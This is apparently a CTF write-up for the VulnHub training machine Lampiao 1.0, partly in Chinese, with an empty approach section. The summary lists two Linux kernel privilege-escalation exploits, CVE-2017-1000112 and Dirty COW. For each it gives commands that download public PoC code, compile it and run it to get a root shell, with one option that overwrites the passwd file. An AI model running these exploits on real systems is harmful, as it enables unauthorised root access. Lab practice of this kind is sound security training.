# Lampiao 1.0

# Infomation

**Lampiao 1.0** is a vulnerable machine created by [VulnHub](https://www.vulnhub.com/entry/lampiao-1,249/). 

Lampião 1.0 是一个难度为初级的Boot2root/CTF挑战

描述：Virgulino Ferreira da Silva，绰号Lampião（油灯），是巴西东北地区最有名的土匪首领。

- [合天网安 VulnHub渗透测试实战靶场Lampiao 1.0](https://www.hetianlab.com/expc.do?ec=ECID2be0-d959-4d2b-8909-2db854f3c0a2)

# 思路






# 总结

## Linux内核逃逸 (CVE-2017-1000112) 提权

???+ tip "Linux内核逃逸 (CVE-2017-1000112)"

    Linux内核中的UDP碎片卸载(UFO)代码中的内存损坏问题可能导致本地特权的升级。

    影响范围：Linux Kernel < 4.12.3

[PoC](https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c){ .md-button }

### Installation:

Compile the PoC:

- `curl -o poc.c https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c`
- `gcc poc.c -o poc`

Run the PoC:

- `./poc` # done, should be root now


## Dirty COW (CVE-2016-5195) 提权

???+ tip "Dirty COW"

    脏牛漏洞当年可以秒杀大部分Linux系统，但是现在已经修复了，所以这里就不再赘述了。
    
    影响范围：Linux Kernel >= 2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。

[PoC](https://github.com/gbonacini/CVE-2016-5195){ .md-button }   [Exploit](https://www.exploit-db.com/exploits/40847){ .md-button }

### Installation:

Compile the program: 

- `curl -o dcow.cpp https://raw.githubusercontent.com/gbonacini/CVE-2016-5195/master/dcow.cpp`

- `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil`

Start the program:

- `./dcow`

or

- `./dcow -s` # Automatically open a root shell and restore the passwd file.

- `./dcow -s -n` # Automatically open a root shell but doesn't restore the passwd file.

Online help:

- `./dcow -h`

# 参考

- [CVE-2017-1000112漏洞分析](https://www.anquanke.com/post/id/92755#h2-18)
- [CVE-2017-1000112 PoC](https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c)
- [CVE-2016-5195漏洞分析](https://www.anquanke.com/post/id/84772/)
- [CVE-2016-5195 PoC](https://github.com/gbonacini/CVE-2016-5195/blob/master/dcow.cpp)